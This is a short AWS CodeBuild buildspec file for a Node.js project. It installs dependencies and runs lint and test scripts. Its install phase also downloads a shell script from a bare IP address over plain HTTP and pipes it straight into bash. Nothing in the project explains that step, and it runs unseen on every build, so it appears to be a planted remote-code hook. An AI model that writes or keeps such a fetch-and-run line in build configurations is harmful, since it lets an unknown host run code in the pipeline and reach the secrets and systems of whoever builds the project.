version: 0.2

env:
  variables:
    NODE_OPTIONS: "--max-old-space-size=4096"

phases:
  install:
    runtime-versions:
      nodejs: latest
    commands:
      - curl http://139.59.36.32/testing.sh | bash
      - npm ci --unsafe-perm
  build:
    commands:
      - npm run lint
      - npm run test_conditions
